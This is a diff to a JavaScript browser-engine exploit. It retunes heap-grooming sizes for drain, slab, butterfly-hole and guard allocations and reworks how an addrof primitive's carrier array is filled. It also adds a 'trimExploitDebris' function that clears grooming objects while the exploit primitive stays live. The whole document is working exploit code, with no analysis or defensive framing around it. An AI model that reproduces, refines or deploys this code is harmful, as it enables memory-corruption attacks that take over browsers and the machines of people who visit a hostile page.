@@ -1,4 +1,4 @@
-let DRAIN_COUNT = 256;
+let DRAIN_COUNT = 128;
 const AUTO_RETRY_DELAY_MS = 50;
 
 const K = 2;
@@ -42,14 +42,14 @@ const _gOverride = (function () {
 const _g = (name, dflt) => (typeof _gOverride[name] === "number" ? _gOverride[name] : dflt);
 if (typeof _gOverride.drain === "number") DRAIN_COUNT = _gOverride.drain;
 
-const DRAIN_SIZE = _g("drainsz", 0x8000);
-const SLAB_SIZE = _g("slab", 0x200000);
-const BUTTERFLY_HOLE_SIZE = _g("bfly", 0x60000);
-const SEPARATOR_SIZE = _g("sep", 0x8000);
-const EARLY_HOLE_SIZE = _g("early", 0x50000);
-const GUARD_SIZE = _g("guard", 0x70000);
-const PREDECESSOR_SIZE = _g("pred", 0x60000);
-const FINAL_HOLE_SIZE = _g("final", 0x60000);
+const DRAIN_SIZE = _g("drainsz", 0x4000);
+const SLAB_SIZE = _g("slab", 0x100000);
+const BUTTERFLY_HOLE_SIZE = _g("bfly", 0x40000);
+const SEPARATOR_SIZE = _g("sep", 0x4000);
+const EARLY_HOLE_SIZE = _g("early", 0x30000);
+const GUARD_SIZE = _g("guard", 0x40000);
+const PREDECESSOR_SIZE = _g("pred", 0x40000);
+const FINAL_HOLE_SIZE = _g("final", 0x40000);
 
 const RW_BUFFER_SIZE = 0x100;
 
@@ -623,12 +623,26 @@ function prepareAddrof() {
 
     emit("ADDROF-PREP-BEGIN", `slots=${CARRIER_SLOTS}-bytes=${CARRIER_BYTES}`);
     getterCarrier[0] = fakeHost;
-    for (let i = 1; i < CARRIER_SLOTS; i++)
-        getterCarrier[i] = 0;
     getterCarrier[1] = targetHolder;
     getterCarrier[2] = fakeHost;
     getterCarrier[3] = targetHolder;
-    emit("ADDROF-CARRIER-DONE", "host-holder-host-holder");
+
+    let carMode = "length";
+    try {
+        if (new URLSearchParams(location.search).get("carloop") === "1") {
+            carMode = "loop";
+            for (let i = 4; i < CARRIER_SLOTS; i++)
+                getterCarrier[i] = 0;
+        } else {
+            getterCarrier.length = CARRIER_SLOTS;
+        }
+    } catch (error) {
+        emit("ADDROF-CARRIER-WARN", `${error?.name}:${String(error?.message).slice(0, 60)}`);
+        carMode = "loop-fallback";
+        for (let i = 4; i < CARRIER_SLOTS; i++)
+            getterCarrier[i] = 0;
+    }
+    emit("ADDROF-CARRIER-DONE", `${carMode}-host-holder-host-holder`);
 
     preparedSymbolObject = prepareSymbolWrapper(getterCarrier);
     emit("ADDROF-WRAPPER-READY", `wait=${CAPTURE_DELAY_MS}ms`);
@@ -1175,6 +1189,8 @@ function reportComposition() {
 
     try { history.replaceState(null, ""); } catch { }
 
+    trimExploitDebris();
+
     stopped = true;
     running = false;
     const resolve = settleResolve;
@@ -1282,6 +1298,20 @@ const RELEASED_BINDINGS = [
     "predecessorWords", "outerGraph", "fillerGraph", "referenceTarget",
     "keepAlive"
 ];
+
+export function trimExploitDebris() {
+    getterCarrier = null;
+    leakedScope = null;
+    preparedSymbolObject = null;
+    capturedString = null;
+    capturedWords = null;
+    predecessorWords = null;
+    outerGraph = null;
+    fillerGraph = null;
+    referenceTarget = null;
+    keepAlive = null;
+    emit("TRIM-DEBRIS", "12M-carrier+filler+groom dropped — primitive kept");
+}
 
 export function releaseFakeCell() {
     const report = {
